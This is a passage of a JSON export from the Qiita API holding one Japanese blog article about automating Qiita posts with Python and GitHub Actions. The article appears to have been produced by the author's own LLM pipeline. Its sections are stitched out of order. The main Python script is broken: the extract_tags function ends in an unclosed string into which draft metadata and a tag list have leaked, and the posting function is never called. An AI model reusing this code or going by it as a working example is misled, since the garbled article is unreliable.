class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"337:1-340:3\"><div class=\"highlight\"><pre><code><span class=\"c\"># 必要なライブラリをインストール</span>\npip <span class=\"nb\">install </span>requests python-dotenv\n</code></pre></div></div>\n<p data-sourcepos=\"342:1-342:133\">次に、GitHub リポジトリに <code>.github/workflows/qiita_post.yml</code> ファイルを作成し、以下の内容を記述します。</p>\n<div class=\"code-frame\" data-lang=\"yaml\" data-sourcepos=\"344:1-369:3\"><div class=\"highlight\"><pre><code><span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Qiita Post</span>\n\n<span class=\"na\">on</span><span class=\"pi\">:</span>\n  <span class=\"na\">push</span><span class=\"pi\">:</span>\n    <span class=\"na\">branches</span><span class=\"pi\">:</span>\n      <span class=\"pi\">-</span> <span class=\"s\">main</span>\n\n<span class=\"na\">jobs</span><span class=\"pi\">:</span>\n  <span class=\"na\">qiita_post</span><span class=\"pi\">:</span>\n    <span class=\"na\">runs-on</span><span class=\"pi\">:</span> <span class=\"s\">ubuntu-latest</span>\n    <span class=\"na\">steps</span><span class=\"pi\">:</span>\n      <span class=\"pi\">-</span> <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">actions/checkout@v3</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Set up Python </span><span class=\"m\">3.11</span>\n        <span class=\"na\">uses</span><span class=\"pi\">:</span> <span class=\"s\">actions/setup-python@v3</span>\n        <span class=\"na\">with</span><span class=\"pi\">:</span>\n          <span class=\"na\">python-version</span><span class=\"pi\">:</span> <span class=\"s2\">\"</span><span class=\"s\">3.11\"</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Install dependencies</span>\n        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"pi\">|</span>\n          <span class=\"s\">python -m pip install --upgrade pip</span>\n          <span class=\"s\">pip install -r requirements.txt</span>\n      <span class=\"pi\">-</span> <span class=\"na\">name</span><span class=\"pi\">:</span> <span class=\"s\">Run Qiita Post Script</span>\n        <span class=\"na\">env</span><span class=\"pi\">:</span>\n          <span class=\"na\">QIITA_ACCESS_TOKEN</span><span class=\"pi\">:</span> <span class=\"s\">${{ secrets.QIITA_ACCESS_TOKEN }}</span>\n        <span class=\"na\">run</span><span class=\"pi\">:</span> <span class=\"s\">python qiita_post.py</span>\n</code></pre></div></div>\n<p data-sourcepos=\"371:1-371:100\"><code>QIITA_ACCESS_TOKEN</code> は、GitHub リポジトリの Secrets に登録する必要があります。</p>\n<h3 data-sourcepos=\"373:1-373:29\">\n<span id=\"2-python-スクリプト\" class=\"fragment\"></span><a href=\"#2-python-%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%88\"><i class=\"fa fa-link\"></i></a>2. Python スクリプト</h3>\n<p data-sourcepos=\"375:1-375:88\">次に、<code>qiita_post.py</code> ファイルを作成し、以下の内容を記述します。</p>\n<div class=\"code-frame\" data-lang=\"python\" data-sourcepos=\"377:1-434:134\"><div class=\"highlight\"><pre><code><span class=\"kn\">import</span> <span class=\"n\">os</span>\n<span class=\"kn\">import</span> <span class=\"n\">requests</span>\n<span class=\"kn\">from</span> <span class=\"n\">dotenv</span> <span class=\"kn\">import</span> <span class=\"n\">load_dotenv</span>\n\n<span class=\"nf\">load_dotenv</span><span class=\"p\">()</span>\n\n<span class=\"n\">QIITA_ACCESS_TOKEN</span> <span class=\"o\">=</span> <span class=\"n\">os</span><span class=\"p\">.</span><span class=\"n\">environ</span><span class=\"p\">.</span><span class=\"nf\">get</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">QIITA_ACCESS_TOKEN</span><span class=\"sh\">\"</span><span class=\"p\">)</span>\n<span class=\"n\">QIITA_API_ENDPOINT</span> <span class=\"o\">=</span> <span class=\"sh\">\"</span><span class=\"s\">https://qiita.com/api/v2/items</span><span class=\"sh\">\"</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">post_to_qiita</span><span class=\"p\">(</span><span class=\"n\">markdown_file_path</span><span class=\"p\">):</span>\n    <span class=\"sh\">\"\"\"</span><span class=\"s\">Qiita に記事を投稿する関数</span><span class=\"sh\">\"\"\"</span>\n    <span class=\"k\">try</span><span class=\"p\">:</span>\n        <span class=\"k\">with</span> <span class=\"nf\">open</span><span class=\"p\">(</span><span class=\"n\">markdown_file_path</span><span class=\"p\">,</span> <span class=\"sh\">\"</span><span class=\"s\">r</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"n\">encoding</span><span class=\"o\">=</span><span class=\"sh\">\"</span><span class=\"s\">utf-8</span><span class=\"sh\">\"</span><span class=\"p\">)</span> <span class=\"k\">as</span> <span class=\"n\">f</span><span class=\"p\">:</span>\n            <span class=\"n\">markdown_content</span> <span class=\"o\">=</span> <span class=\"n\">f</span><span class=\"p\">.</span><span class=\"nf\">read</span><span class=\"p\">()</span>\n\n        <span class=\"c1\"># タイトルを抽出 (最初の行が # で始まる場合)\n</span>        <span class=\"n\">lines</span> <span class=\"o\">=</span> <span class=\"n\">markdown_content</span><span class=\"p\">.</span><span class=\"nf\">splitlines</span><span class=\"p\">()</span>\n        <span class=\"n\">title</span> <span class=\"o\">=</span> <span class=\"n\">lines</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"nf\">replace</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\"># </span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"sh\">\"\"</span><span class=\"p\">)</span> <span class=\"k\">if</span> <span class=\"n\">lines</span> <span class=\"ow\">and</span> <span class=\"n\">lines</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">].</span><span class=\"nf\">startswith</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\"># </span><span class=\"sh\">\"</span><span class=\"p\">)</span> <span class=\"k\">else</span> <span class=\"sh\">\"</span><span class=\"s\">No Title</span><span class=\"sh\">\"</span>\n\n        <span class=\"c1\"># Markdown ファイルから必要な情報を抽出\n</span>        <span class=\"n\">body</span> <span class=\"o\">=</span> <span class=\"n\">markdown_content</span>\n        <span class=\"n\">tags</span> <span class=\"o\">=</span> <span class=\"nf\">extract_tags</span><span class=\"p\">(</span><span class=\"n\">markdown_content</span><span class=\"p\">)</span> <span class=\"c1\"># タグを抽出する関数は別途定義\n</span>\n        <span class=\"c1\"># Qiita API に投稿\n</span>        <span class=\"n\">headers</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n            <span class=\"sh\">\"</span><span class=\"s\">Authorization</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"sa\">f</span><span class=\"sh\">\"</span><span class=\"s\">Bearer </span><span class=\"si\">{</span><span class=\"n\">QIITA_ACCESS_TOKEN</span><span class=\"si\">}</span><span class=\"sh\">\"</span><span class=\"p\">,</span>\n            <span class=\"sh\">\"</span><span class=\"s\">Content-Type</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"sh\">\"</span><span class=\"s\">application/json</span><span class=\"sh\">\"</span><span class=\"p\">,</span>\n        <span class=\"p\">}</span>\n        <span class=\"n\">data</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n            <span class=\"sh\">\"</span><span class=\"s\">title</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"n\">title</span><span class=\"p\">,</span>\n            <span class=\"sh\">\"</span><span class=\"s\">body</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"n\">body</span><span class=\"p\">,</span>\n            <span class=\"sh\">\"</span><span class=\"s\">tags</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"p\">[{</span><span class=\"sh\">\"</span><span class=\"s\">name</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"n\">tag</span><span class=\"p\">}</span> <span class=\"k\">for</span> <span class=\"n\">tag</span> <span class=\"ow\">in</span> <span class=\"n\">tags</span><span class=\"p\">],</span>\n            <span class=\"sh\">\"</span><span class=\"s\">private</span><span class=\"sh\">\"</span><span class=\"p\">:</span> <span class=\"bp\">False</span><span class=\"p\">,</span>  <span class=\"c1\"># 公開設定\n</span>        <span class=\"p\">}</span>\n        <span class=\"n\">response</span> <span class=\"o\">=</span> <span class=\"n\">requests</span><span class=\"p\">.</span><span class=\"nf\">post</span><span class=\"p\">(</span><span class=\"n\">QIITA_API_ENDPOINT</span><span class=\"p\">,</span> <span class=\"n\">headers</span><span class=\"o\">=</span><span class=\"n\">headers</span><span class=\"p\">,</span> <span class=\"n\">json</span><span class=\"o\">=</span><span class=\"n\">data</span><span class=\"p\">)</span>\n\n        <span class=\"c1\"># レスポンスを確認\n</span>        <span class=\"n\">response</span><span class=\"p\">.</span><span class=\"nf\">raise_for_status</span><span class=\"p\">()</span>  <span class=\"c1\"># エラーがあれば例外を発生\n</span>        <span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">記事の投稿に成功しました！</span><span class=\"sh\">\"</span><span class=\"p\">)</span>\n        <span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"sh\">\"</span><span class=\"s\">投稿URL: </span><span class=\"si\">{</span><span class=\"n\">response</span><span class=\"p\">.</span><span class=\"nf\">json</span><span class=\"p\">()[</span><span class=\"sh\">'</span><span class=\"s\">url</span><span class=\"sh\">'</span><span class=\"p\">]</span><span class=\"si\">}</span><span class=\"sh\">\"</span><span class=\"p\">)</span>\n\n    <span class=\"k\">except</span> <span class=\"n\">requests</span><span class=\"p\">.</span><span class=\"n\">exceptions</span><span class=\"p\">.</span><span class=\"n\">RequestException</span> <span class=\"k\">as</span> <span class=\"n\">e</span><span class=\"p\">:</span>\n        <span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"sh\">\"</span><span class=\"s\">APIリクエストエラー: </span><span class=\"si\">{</span><span class=\"n\">e</span><span class=\"si\">}</span><span class=\"sh\">\"</span><span class=\"p\">)</span>\n    <span class=\"k\">except</span> <span class=\"nb\">FileNotFoundError</span><span class=\"p\">:</span>\n        <span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"sh\">\"</span><span class=\"s\">ファイルが見つかりません: </span><span class=\"si\">{</span><span class=\"n\">markdown_file_path</span><span class=\"si\">}</span><span class=\"sh\">\"</span><span class=\"p\">)</span>\n    <span class=\"k\">except</span> <span class=\"nb\">Exception</span> <span class=\"k\">as</span> <span class=\"n\">e</span><span class=\"p\">:</span>\n        <span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"sh\">\"</span><span class=\"s\">予期せぬエラーが発生しました: </span><span class=\"si\">{</span><span class=\"n\">e</span><span class=\"si\">}</span><span class=\"sh\">\"</span><span class=\"p\">)</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">extract_tags</span><span class=\"p\">(</span><span class=\"n\">markdown_content</span><span class=\"p\">):</span>\n    <span class=\"sh\">\"\"\"</span><span class=\"s\">Markdown ファイルからタグを抽出する関数（例）</span><span class=\"sh\">\"\"\"</span>\n    <span class=\"c1\"># 簡単な例として、ファイル名からタグを生成\n</span>    <span class=\"c1\"># 実際には、Markdown の内容を解析してタグを抽出する処理を実装する\n</span>    <span class=\"k\">return</span> <span class=\"p\">[</span><span class=\"sh\">\"</span><span class=\"s\">\n\n生成日時: 2025-12-05 17:07:33\nステータス: draft\nタグ: Qiita, 環境構築, Python, エンジニア向け, GitHubActions, スクリプト, CI/CD, Tips, 自動化, パイプライン\n</span></code></pre></div></div>\n",
      "body": "> **対象読者**  \n> Python を利用したことがあるエンジニア、GitHub Actions を利用したことがあるエンジニア、Qiita への投稿を効率化したい方\n\n> **動作確認環境 / 前提条件**  \n> - macOS Ventura 13.6.3\n> - Python 3.11.5\n> - GitHub アカウント\n> - Qiita API v2 の理解（[公式ドキュメント](https://qiita.com/api/v2/docs)参照）\n> - 以前の記事「[Python × GitHub Actions で始める！Qiita 自動投稿パイプライン構築術](https://qiita.com/cocokara_bioinfo/items/7440c80d8e6a98177957)」の内容を理解していること\n\n> **この記事で得られること**\n> - Qiita 記事投稿を自動化する Python スクリプトの構築方法\n> - GitHub Actions を利用した CI/CD パイプラインの構築方法\n> - 自動化パイプライン構築におけるハマりどころと、その解決策\n\n\n## 実際に躓いたポイントと解決策\n\n### 1. Gemini APIのモデル名エラー\n\n**問題**: \n```\n404 models/gemini-1.5-flash is not found for API version v1beta\n```\n\n**原因**: \n- 設定ファイルで`gemini-1.5-flash`を指定していたが、実際に利用可能なモデルは`models/gemini-2.0-flash`だった\n- Google Gemini APIは定期的にモデル名が更新される\n\n**解決策**:\n```python\n# 利用可能なモデルを確認\nmodels = [m for m in genai.list_models() \n          if 'generateContent' in m.supported_generation_methods]\n# 結果: models/gemini-2.0-flash, models/gemini-2.5-flash など\n\n# 設定ファイルを更新\n{\n  \"api\": {\n    \"gemini\": {\n      \"model\": \"models/gemini-2.0-flash\"  # models/プレフィックスが必要\n    }\n  }\n}\n```\n\n**学んだこと**: APIの仕様変更に備えて、利用可能なモデルを動的に確認する仕組みを追加すべき\n\n### 2. WindowsコンソールのUnicode文字表示エラー\n\n**問題**:\n```\nUnicodeEncodeError: 'cp932' codec can't encode character '✓' in position 0\n```\n\n**原因**: \n- WindowsのPowerShellでは、Unicode文字（✓、⚠、✗）がデフォルトのエンコーディング（cp932）で表示できない\n\n**解決策**:\n```python\n# Unicode文字を通常の文字に置き換え\nprint(f\"[OK] 処理が完了しました\")  # ✓ → [OK]\nprint(f\"[WARN] 警告メッセージ\")    # ⚠ → [WARN]\nprint(f\"[ERROR] エラーが発生\")     # ✗ → [ERROR]\n```\n\n**学んだこと**: クロスプラットフォーム対応では、Unicode文字の使用を避けるか、エンコーディングを明示的に設定する\n\n### 3. Qiita APIのタグ数制限による403エラー\n\n**問題**:\n```\nHTTPエラー: 403 - {'message': 'Forbidden', 'type': 'forbidden'}\n```\n\n**原因**: \n- 動的タグ生成で9個のタグを生成していたが、Qiita APIはタグを最大5個までしか受け付けない\n- APIドキュメントを確認せずに実装していた\n\n**解決策**:\n```python\n# タグを5個に制限\nif len(tags) > 5:\n    print(f\"[WARN] タグが{len(tags)}個ありますが、Qiita APIの制限により5個に制限します\")\nqiita_tags = [{\"name\": tag} for tag in tags[:5]]\n```\n\n**学んだこと**: \n- APIの仕様を事前に確認する重要性\n- エラーメッセージが不十分な場合、リクエスト内容を詳細にログ出力して原因を特定する\n\n### 4. LLMプロンプトの設計ミス\n\n**問題**: \n- タイトル案を3つ生成していたが、実際のタイトルが「使用例」になってしまった\n- パース処理でタイトルが正しく抽出できなかった\n\n**原因**:\n- プロンプトで「タイトル案（3つ）」を指示していたが、実際のタイトルを明確に指定していなかった\n- パース処理がタイトル案セクションをスキップできていなかった\n\n**解決策**:\n```markdown\n# プロンプトの修正\n**重要**: 記事の最初の行に、実際に使用するタイトルを`# `で始まるMarkdownの見出し形式で記述してください。\n\nタイトル案は不要です。最初の`# `行がそのまま記事のタイトルとして使用されます。\n```\n\n```python\n# パース処理の改善\nskip_title_section = False\nfor line in lines:\n    # タイトル案セクションを検出してスキップ\n    if \"タイトル案\" in line:\n        skip_title_section = True\n        continue\n    \n    # 最初の`# `で始まる行をタイトルとして取得\n    if not found_main_title and line.startswith(\"# \"):\n        title = line.replace(\"# \", \"\").strip()\n        found_main_title = True\n```\n\n**学んだこと**: \n- LLMへのプロンプトは明確で具体的な指示が必要\n- 出力形式を厳密に指定することで、パース処理を簡潔にできる\n\n### 5. エラーハンドリングの不足\n\n**問題**: \n- 403エラーが発生した際、原因が特定しづらかった\n- デバッグ情報が不足していた\n\n**解決策**:\n```python\n# デバッグ情報の追加\nprint(f\"[DEBUG] アクセストークン: {token_preview}\")\nprint(f\"[DEBUG] リクエストURL: {self.base_url}/items\")\nprint(f\"[DEBUG] ペイロード: title={title[:50]}, tags={len(tags)}個\")\nprint(f\"[DEBUG] レスポンスステータス: {response.status_code}\")\n\n# エラーメッセージの改善\nif e.response.status_code == 403:\n    error_msg += \"\n\n考えられる原因:\"\n    error_msg += \"\n- アクセストークンのスコープが不足しています\"\n    error_msg += \"\n- タグ数が5個を超えています（Qiita APIの制限）\"\n```\n\n**学んだこと**: \n- エラー発生時には、リクエスト内容とレスポンスを詳細にログ出力する\n- よくあるエラーについては、解決策を提示する\n\n## 工夫したポイント\n\n### 1. プロンプト管理システム\n\nプロンプトをMarkdownファイルとして管理し、変数置換に対応：\n\n```python\n# data/prompts/article_generation_prompt.md\nトピック: {topic}\nリサーチ結果: {research_results}\n過去の投稿: {past_articles_summary}\n\n# 使用例\nprompt = template.format(\n    topic=selected_topic,\n    research_results=research_results,\n    past_articles_summary=past_articles_summary\n)\n```\n\n**メリット**: \n- プロンプトの変更が容易\n- バージョン管理がしやすい\n- 複数のプロンプトを管理できる\n\n### 2. 過去の投稿参照機能\n\n過去のQiita投稿を取得し、ストーリー性のある記事を生成：\n\n```python\n# 過去の投稿を取得\nfetcher = QiitaFetcher()\nitems = fetcher.fetch_all_my_items(days_back=180)\n\n# 記事生成時に参照\npast_articles_summary = qiita_items_manager.get_items_summary(limit=10)\n```\n\n**メリット**: \n- 連続性のある記事シリーズを構築できる\n- 読者が「次も読みたい」と思える内容になる\n- 過去の投稿への参照リンクを自動生成\n\n### 3. 動的タグ生成\n\n記事内容に応じてLLMが自動的にタグを生成：\n\n```python\ndef generate_dynamic_tags(title: str, content: str) -> List[str]:\n    # 記事のタイトルと内容を分析してタグを生成\n    # 言語・ツール系、目的・行為ベース、プラットフォーム系など\n    # カテゴリから適切なタグを選ぶ\n```\n\n**メリット**: \n- 記事内容に最適なタグが自動生成される\n- 手動でのタグ付けが不要\n- タグの漏れを防げる\n\n### 4. モジュール化とエラーハンドリング\n\n各機能を独立したモジュールに分割し、エラーハンドリングを強化：\n\n```python\n# 各モジュールが独立して動作\n- research/collector.py      # リサーチ機能\n- generator/article_generator.py  # 記事生成\n- publisher/qiita_publisher.py    # 投稿機能\n- storage/article_manager.py      # 記事管理\n```\n\n**メリット**: \n- テストが容易\n- 機能の追加・変更が容易\n- エラーの影響範囲を限定できる\n\n## 参考文献\n\n- [Qiita API v2 ドキュメント](https://qiita.com/api/v2/docs)\n  - タグの制限（最大5個）などの仕様を確認\n\n- [Google Gemini API ドキュメント](https://ai.google.dev/docs)\n  - 利用可能なモデル一覧とAPIの使い方\n\n- [Python requests ライブラリ](https://requests.readthedocs.io/)\n  - HTTPリクエストのエラーハンドリング方法\n\n- [python-dotenv ドキュメント](https://github.com/theskumar/python-dotenv)\n  - 環境変数の管理方法\n\n- [Qiita API を利用した記事投稿の実装例](https://qiita.com/iimuz/items/4837e9c8043ce7c1262b)\n  - アクセストークンの取得方法と投稿の実装\n\n## まとめ\n\n今回の開発を通じて、以下の点を学びました：\n\n1. **APIの仕様を事前に確認する重要性**: タグ数の制限など、APIの制約を理解しておく\n2. **エラーハンドリングの重要性**: デバッグ情報を充実させ、原因特定を容易にする\n3. **プロンプト設計の重要性**: LLMへの指示は明確で具体的にする\n4. **クロスプラットフォーム対応**: Unicode文字の使用に注意する\n5. **モジュール化の重要性**: 機能を分割し、テストとメンテナンスを容易にする\n\nこれらの経験を活かして、より堅牢なシステムを構築していきたいと思います。\n\n\n\n## 🧭 導入：背景・課題・なぜ重要か\n\n「記事書くの、めんどくさい…」\n\nエンジニアなら誰しも一度は思ったことがあるのではないでしょうか？特に Qiita のような技術情報共有プラットフォームでは、継続的なアウトプットが重要だと分かっていても、ついつい後回しにしてしまいがちです。\n\n以前の記事「[Python × GitHub Actions で始める！Qiita 自動投稿パイプライン構築術](https://qiita.com/cocokara_bioinfo/items/7440c80d8e6a98177957)」では、Qiita への記事投稿を自動化する基本的なパイプラインを構築しました。しかし、実際に運用してみると、いくつかの課題が見えてきました。\n\n*   **ローカル環境との差異**: ローカルで動いていたスクリプトが GitHub Actions 上で動かない…あるあるですよね。\n*   **エラーハンドリングの甘さ**: エラーが発生した場合に、どこが原因なのか特定しにくい…デバッグ地獄！\n*   **API レート制限**: Qiita API のレート制限に引っかかって投稿が失敗する…焦る！\n\nこれらの課題を解決し、より安定した自動投稿パイプラインを構築するために、試行錯誤した過程を共有したいと思います。今回の記事では、これらの **“あるある” な課題** に焦点を当て、具体的な解決策と、さらに効率的な運用方法を紹介します。\n\n## 📘 トピックの概要（専門外にも分かる説明）\n\n今回のテーマは、**Qiita 記事の自動投稿パイプライン構築** です。\n\n**パイプライン** とは、一連の処理を自動的に実行する仕組みのことです。今回の場合は、以下のような流れになります。\n\n1.  記事の Markdown ファイルを GitHub リポジトリに push\n2.  GitHub Actions が push を検知して自動的にスクリプトを実行\n3.  スクリプトが Qiita API を利用して記事を投稿\n\nこのパイプラインを構築することで、記事を書いたら GitHub に push するだけで Qiita に投稿されるようになります。\n\n今回の記事では、特に以下の点に焦点を当てて解説します。\n\n*   **環境構築**: GitHub Actions 上で Python スクリプトを実行するための環境構築\n*   **エラーハンドリング**: エラーが発生した場合に、原因を特定しやすくするための工夫\n*   **レート制限対策**: Qiita API のレート制限に引っかからないようにするための対策\n\n## 🔧 技術的な仕組み・実装・アーキテクチャ\n\n今回のパイプラインは、主に以下の要素で構成されています。\n\n1.  **Python スクリプト**: Qiita API を利用して記事を投稿するスクリプト\n2.  **GitHub Actions**: GitHub の CI/CD サービス。push をトリガーにしてスクリプトを実行\n3.  **Qiita API**: Qiita の記事投稿 API\n\n**Python スクリプト** は、Markdown ファイルを読み込み、Qiita API に必要な情報を整形してリクエストを送信します。\n\n**GitHub Actions** は、`.github/workflows` ディレクトリに YAML ファイルを配置することで、様々なイベントをトリガーにして処理を実行できます。今回は、`push` イベントをトリガーにして、Python スクリプトを実行します。\n\n**Qiita API** は、記事の投稿、更新、削除などを行うための API です。API を利用するためには、事前に Qiita でアクセストークンを取得する必要があります。\n\n### メリット・デメリット\n\n**メリット**:\n\n*   記事投稿の手間を大幅に削減できる\n*   継続的なアウトプットを促進できる\n*   チームでの記事作成を効率化できる\n\n**デメリット**:\n\n*   初期構築に手間がかかる\n*   API のレート制限に注意する必要がある\n*   スクリプトのメンテナンスが必要\n\n### ハマりポイント・注意点\n\n*   **環境変数**: GitHub Actions 上で環境変数を設定する必要がある\n*   **依存関係**: 必要な Python ライブラリを `requirements.txt` に記述する必要がある\n*   **エラーハンドリング**: エラーが発生した場合に、原因を特定できるようにログを出力するようにする\n\n## 🧪 実践編：動くコード／コマンド例\n\n### 1. 環境構築\n\nまず、必要な Python ライブラリをインストールします。\n\n```bash\n# 必要なライブラリをインストール\npip install requests python-dotenv\n```\n\n次に、GitHub リポジトリに `.github/workflows/qiita_post.yml` ファイルを作成し、以下の内容を記述します。\n\n```yaml\nname: Qiita Post\n\non:\n  push:\n    branches:\n      - main\n\njobs:\n  qiita_post:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n      - name: Set up Python 3.11\n        uses: actions/setup-python@v3\n        with:\n          python-version: \"3.11\"\n      - name: Install dependencies\n        run: |\n          python -m pip install --upgrade pip\n          pip install -r requirements.txt\n      - name: Run Qiita Post Script\n        env:\n          QIITA_ACCESS_TOKEN: ${{ secrets.QIITA_ACCESS_TOKEN }}\n        run: python qiita_post.py\n```\n\n`QIITA_ACCESS_TOKEN` は、GitHub リポジトリの Secrets に登録する必要があります。\n\n### 2. Python スクリプト\n\n次に、`qiita_post.py` ファイルを作成し、以下の内容を記述します。\n\n```python\nimport os\nimport requests\nfrom dotenv import load_dotenv\n\nload_dotenv()\n\nQIITA_ACCESS_TOKEN = os.environ.get(\"QIITA_ACCESS_TOKEN\")\nQIITA_API_ENDPOINT = \"https://qiita.com/api/v2/items\"\n\ndef post_to_qiita(markdown_file_path):\n    \"\"\"Qiita に記事を投稿する関数\"\"\"\n    try:\n        with open(markdown_file_path, \"r\", encoding=\"utf-8\") as f:\n            markdown_content = f.read()\n\n        # タイトルを抽出 (最初の行が # で始まる場合)\n        lines = markdown_content.splitlines()\n        title = lines[0].replace(\"# \", \"\") if lines and lines[0].startswith(\"# \") else \"No Title\"\n\n        # Markdown ファイルから必要な情報を抽出\n        body = markdown_content\n        tags = extract_tags(markdown_content) # タグを抽出する関数は別途定義\n\n        # Qiita API に投稿\n        headers = {\n            \"Authorization\": f\"Bearer {QIITA_ACCESS_TOKEN}\",\n            \"Content-Type\": \"application/json\",\n        }\n        data = {\n            \"title\": title,\n            \"body\": body,\n            \"tags\": [{\"name\": tag} for tag in tags],\n            \"private\": False,  # 公開設定\n        }\n        response = requests.post(QIITA_API_ENDPOINT, headers=headers, json=data)\n\n        # レスポンスを確認\n        response.raise_for_status()  # エラーがあれば例外を発生\n        print(\"記事の投稿に成功しました！\")\n        print(f\"投稿URL: {response.json()['url']}\")\n\n    except requests.exceptions.RequestException as e:\n        print(f\"APIリクエストエラー: {e}\")\n    except FileNotFoundError:\n        print(f\"ファイルが見つかりません: {markdown_file_path}\")\n    except Exception as e:\n        print(f\"予期せぬエラーが発生しました: {e}\")\n\ndef extract_tags(markdown_content):\n    \"\"\"Markdown ファイルからタグを抽出する関数（例）\"\"\"\n    # 簡単な例として、ファイル名からタグを生成\n    # 実際には、Markdown の内容を解析してタグを抽出する処理を実装する\n    return [\"\n\n生成日時: 2025-12-05 17:07:33\nステータス: draft\nタグ: Qiita, 環境構築, Python, エンジニア向け, GitHubActions, スクリプト, CI/CD, Tips, 自動化, パイプライン\n",
      "coediting": false,
      "comments_count": 0,
      "created_at": "2025-12-05T17:09:48+09:00",
      "group": null,
      "id": "4bd415ef2f801497951e",
      "likes_count": 0,
      "private": false,
      "reactions_count": 0,
      "stocks_count": 0,
      "tags": [
        {
          "name": "Qiita",
          "versions": []
        },
        {
          "name": "Python",
          "versions": []
        },
        {
          "name": "環境構築",
          "versions": []
        },
        {
          "name": "エンジニア向け",
          "versions": []
        },
        {
          "name": "GitHubActions",
          "versions": []
        }
      ],
      "title": "【ハマりどころ満載】PythonでQiita記事投稿を自動化するパイプライン構築で爆速改善！",
      "updated_at": "2025-12-05T17:09:48+09:00",
      "url": "https://qiita.com/cocokara_bioinfo/items/4bd415ef2f801497951e",
      "user": {
        "description": "ポッケ村出身の名もなき若手生物学研究員です。\r\n現代の技術やエンジニア知識を学びながらモンスターハンターの生態・生物学研究に日々励んでおります！\r\nまだまだ勉強不足なところはありますが、皆さんに少しでも学びになるものをお届けできればとの思いで発信させていただきます\r\n\r\n※フィクションとして、時にTips記事として楽しんでいただければ幸いです",
        "facebook_id": "",
        "followees_count": 3,
        "followers_count": 0,
        "github_login_name": null,
        "id": "cocokara_bioinfo",
        "items_count": 4,
        "linkedin_id": "",
        "location": "",
        "name": "シャル・S 調査員",
        "organization": "Genome & Ecology Monster-Lab (架空)",
        "permanent_id": 4288059,
        "profile_image_url": "https://lh3.googleusercontent.com/a/ACg8ocLkgrrRuDzozKQ4XeInetzc0um1rPWRGXY2daT9pLIi1z1JdQ=s96-c",
        "team_only": false,
        "twitter_screen_name": null,
        "website_url": ""
      },
      "page_views_count": 115,
      "team_membership": null,
      "organization_url_name": null,
      "slide": false,
      "_source": "my_popular"
    }
  ]
}